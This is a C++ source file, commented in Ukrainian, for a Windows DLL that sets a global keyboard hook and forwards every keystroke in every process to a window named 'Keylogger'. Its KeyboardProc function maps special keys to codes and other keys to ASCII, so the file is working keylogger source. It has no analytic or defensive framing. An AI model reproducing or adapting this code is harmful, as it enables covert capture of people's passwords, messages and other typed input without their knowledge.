#include <system.hpp>
#pragma data_seg(".hdata") // секція в пам'яті загальна для всіх процесів
HINSTANCE hi=NULL; // хендл бібліотеки пастки
#pragma data_seg() // кінець секції
#pragma comment(linker, "/section:.hdata,rws") // надаємо доступ до секції

// дерективи зв'язку для експортування функції
#ifdef __cplusplus
#define EXPORT extern "C" __declspec (dllexport)
#else
#define EXPORT __declspec (dllexport)
#endif

EXPORT BOOL SetKeyboardHook(void); // оголошення експортованої функції

HHOOK hKeyHook=NULL; //хендл пастки (хука)

// переклад віртуального коду клавіші в аскі код
short GetSymbolFromVK(WPARAM wParam)
{
    BYTE btKeyState[256]; //для зберігання стану клавіш
    HKL hklLayout = GetKeyboardLayout(0); // дізнатись розкладку клавіатури
    WORD Symbol; //для зберігання результату перекладу
    GetKeyboardState(btKeyState); //отрімати стан клавіш
     //переклад віртуального коду в аскі
    if((ToAsciiEx(wParam, MapVirtualKey(wParam, 0), btKeyState, &Symbol, 0, hklLayout) == 1) &&
                 GetKeyState(VK_CONTROL) >= 0 && GetKeyState(VK_MENU) >= 0) // перевірка CTRL і ALT
        return Symbol;
     return -1;
}

//головна функція бібліотеки (точка входу)
BOOL APIENTRY DllMain(HINSTANCE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)
{
    switch(ul_reason_for_call) //обробка причини виклику бібліотеки
     {
        case DLL_PROCESS_ATTACH: // викликається кожного разу коли новий процес завантажує DLL в свою пам'ять
        {
            if(!hi) // запам'ятовуємо запускаючий хендл(наша DLL) тільки перший раз
                hi=hModule;
            char pfad[MAX_PATH]; // шлях до файлу повинен обов'язково бути повним, тому що кожній процес
               // буде створювати новий в своєму каталозі
            GetModuleFileName(hi,pfad,MAX_PATH); // шлях до ДЛЛ
            *(strrchr(pfad,'\\')+1)='\0'; //викид імені
            break;
        }
         case DLL_PROCESS_DETACH: //при вивантаженні бібліотеки
        {
            UnhookWindowsHookEx(hKeyHook); //зняти хук
            break;
        }
        default:
            break;
    }
    return TRUE ;
}

// викликається при натисканні чи відпусканні клавіші
LRESULT CALLBACK KeyboardProc(int nCode,WPARAM wParam,LPARAM lParam)
{
    if (nCode)
        return CallNextHookEx(hKeyHook,nCode,wParam,lParam);
    if(lParam>=0){ // при натисканні
       //обробка коду клавіші, якщо не символ то відправити заданий код вікну Keylogger
       switch ((char)wParam){
           case VK_RETURN: SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 300, lParam); break; // enter
           case VK_BACK: SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 301, lParam); break; //BACKSPACE
           case VK_TAB: SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 302, lParam);break; //TAB
           case VK_SHIFT: SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 303, lParam); break;
           case VK_CONTROL: SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 304, lParam); break;
           case VK_MENU: SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 305, lParam); break;//ALT
           case VK_PAUSE: SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 306, lParam); break;//Pause
           case VK_CAPITAL: SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 307, lParam); break;//CAPS LOCK
           case VK_ESCAPE: SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 308, lParam); break;//ESC
           case VK_PRIOR: SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 309, lParam); break;//PAGE UP
           case VK_NEXT: SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 310, lParam); break;//PAGE DOWN
           case VK_END:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 311, lParam); break;//END
           case VK_HOME: SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 312, lParam); break;//HOME
           case VK_LEFT:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 313, lParam); break;//LEFT ARROW
           case VK_UP:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 314, lParam); break;//UP ARROW
           case VK_RIGHT:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 315, lParam); break;//RIGHT ARROW
           case VK_DOWN:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 316, lParam); break;//DOWN ARROW
           case VK_SNAPSHOT:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 317, lParam); break;//PRINT SCREEN
           case VK_INSERT:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 318, lParam); break;//Insert
           case VK_DELETE:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 319, lParam); break;//Delete
           case VK_LWIN:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 320, lParam); break;//Left Windows key
           case VK_RWIN:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 321, lParam); break;//Right Windows key
           case VK_F1:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 401, lParam); break; //F1
           case VK_F2:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 402, lParam); break; //F2
           case VK_F3:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 403, lParam); break;
           case VK_F4:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 404, lParam); break;
           case VK_F5:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 405, lParam); break;
           case VK_F6:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 406, lParam);break;
           case VK_F7:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 407, lParam);break;
           case VK_F8:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 408, lParam); break;
           case VK_F9:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 409, lParam);break;
           case VK_F10:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 410, lParam); break;
           case VK_F11:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 411, lParam); break;
           case VK_F12:SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, 412, lParam);break;
           default:
                //якщо не знайдено відповідності, то відправити аскі код символа
               SendMessage(FindWindow(NULL,"Keylogger"), WH_KEYBOARD, GetSymbolFromVK(wParam), lParam);
       }
    }
    return CallNextHookEx(hKeyHook,nCode,wParam,lParam); // передати подію натискання далі
}

// функція для встановлення пастки, буде викликатись з програми керування
BOOL SetKeyboardHook(void) 
{
    hKeyHook=SetWindowsHookEx(WH_KEYBOARD,(int (__stdcall *)())&KeyboardProc,hi,0);
    return hKeyHook && true;
}
